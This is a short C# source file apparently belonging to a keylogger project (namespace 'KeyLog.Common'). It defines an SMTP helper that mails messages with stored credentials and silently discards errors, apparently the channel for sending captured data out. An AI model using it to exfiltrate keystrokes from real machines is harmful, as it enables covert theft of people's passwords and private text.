using System;
using System.Net;
using System.Net.Mail;
using Map = System.Collections.Generic.Dictionary<string, string>;


namespace KeyLog.Common {
  class Smtp {

    SmtpClient  Client;
    public string From;
    public string To;

    public Smtp(Map o) {
      Client = new SmtpClient(o["host"], int.Parse(o["port"]));
      Client.Credentials = new NetworkCredential(o["username"], o["password"]);
      From = o["from"];
      To = o["to"];
    }

    public void Send(string subject, string body) {
      MailMessage m = new MailMessage(From, To, subject, body);
      try { Client.SendAsync(m, null); }
      catch (Exception) {}
    }
  }
}
